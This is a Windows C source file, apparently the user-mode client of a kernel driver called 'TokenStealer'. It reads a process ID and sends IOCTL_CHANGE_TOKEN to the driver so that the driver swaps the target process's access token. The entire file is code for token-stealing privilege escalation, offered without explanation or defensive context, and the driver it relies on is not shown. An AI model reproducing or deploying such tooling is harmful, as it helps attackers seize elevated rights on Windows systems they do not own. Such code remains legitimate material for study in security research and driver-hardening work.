#include <stdio.h>
#include <Windows.h>
#include "..\Driver\TokerStealer.h"



int PrintError(PCSTR error) {
	printf("%s (error=%d)\n", error, GetLastError());
	return 1;
}

int main() {

	HANDLE hDevice = CreateFile(L"\\\\.\\TokenStealer", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		PrintError("Error in openning device");
	}
	Data processInformation;
	BOOL success = 0;
	char* input = (char*)LocalAlloc(LPTR, 8);
	ULONG processId = 0;
	printf("enter process Id: ");
	scanf_s("%s", input, 8);
	processId = atoi(input);
	if (processId == 0) {
		printf("Please enter a <process Id> next time");
		return 0;
	}
	else {
		processInformation.ProcessId = processId;
	}
	DWORD returnedBytes = 0;
	success = DeviceIoControl(hDevice, IOCTL_CHANGE_TOKEN, &processInformation, sizeof(processInformation), NULL, 0, &returnedBytes, NULL);
	if (success) {
		printf("Process Token have changed\n");
	}
	else {
		PrintError("Error in changing process Token");

		CloseHandle(hDevice);
		return 0;
	}
}